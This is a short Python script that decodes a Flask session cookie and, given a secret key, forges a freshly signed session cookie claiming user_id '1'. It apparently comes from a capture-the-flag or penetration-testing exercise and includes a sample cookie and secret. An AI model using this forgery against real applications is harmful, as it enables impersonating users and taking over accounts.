from itsdangerous import base64_decode, URLSafeTimedSerializer
from flask.sessions import SecureCookieSessionInterface
from hashlib import sha512
from flask.sessions import session_json_serializer
from itsdangerous import URLSafeTimedSerializer, BadTimeSignature
import base64
import zlib

EXAMPLE_SESSION = '.eJwlj0tqQzEMAO_idRb6WJaUyzxsS6Yh0MJ7yar07jF0OYuBmd9yrDOvr3J_ne-8leMR5V4aJwyY1EHTofKw8IltdVZShQXJLraakpkOibHY--yjV2djYtzgSOyGzeZiqUxCgBiNWuqs3c2s1rAYKGhqEUEp4iykKOVW5nWu4_XzzO_dw-wETrNyz9rWjmCu2hPn3GYDgHAVX9t7X3n-T3D5-wC1zzyX.Xj9zYQ.SdKzYexnm2X8SSN2EDhZh1MBYRk'

session_payload = EXAMPLE_SESSION[1:].split('.')[0]
print("Extracted Session datas : {}".format(session_payload))
decoded_session_payload = base64.urlsafe_b64decode(session_payload)
decompressed_session_payload = zlib.decompress(decoded_session_payload)
print("Extracted decoded uncompressed datas : {} ".format(decompressed_session_payload))









class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    # NOTE: Override method
    def get_signing_serializer(self, secret_key):
        signer_kwargs = {
            'key_derivation': self.key_derivation,
            'digest_method': self.digest_method
        }
        return URLSafeTimedSerializer(
            secret_key,
            salt=self.salt,
            serializer=self.serializer,
            signer_kwargs=signer_kwargs
        )


class FlaskSessionCookieManager:
    @classmethod
    def decode(cls, secret_key, cookie):
        sscsi = SimpleSecureCookieSessionInterface()
        signingSerializer = sscsi.get_signing_serializer(secret_key)
        return signingSerializer.loads(cookie)

    @classmethod
    def encode(cls, secret_key, session):
        sscsi = SimpleSecureCookieSessionInterface()
        signingSerializer = sscsi.get_signing_serializer(secret_key)
        return signingSerializer.dumps(session)


secret_key = 'e03c9698104e6081f4c5892aad939e45'

session = {
    "_fresh": True, 
    "_id": "63e0b0c2a07e9043b8d9c16fa372770f0e3958f672887b5dbf39acaba49383231aca912398168cf3543252011d626e7c4a988844d8db151878ddd2e559352715",
    "csrf_token": "3392092c43ae46f7273347ae1cc8dd6000d9759f", 
    "user_id": "1"
}
print(FlaskSessionCookieManager.encode(secret_key, session))
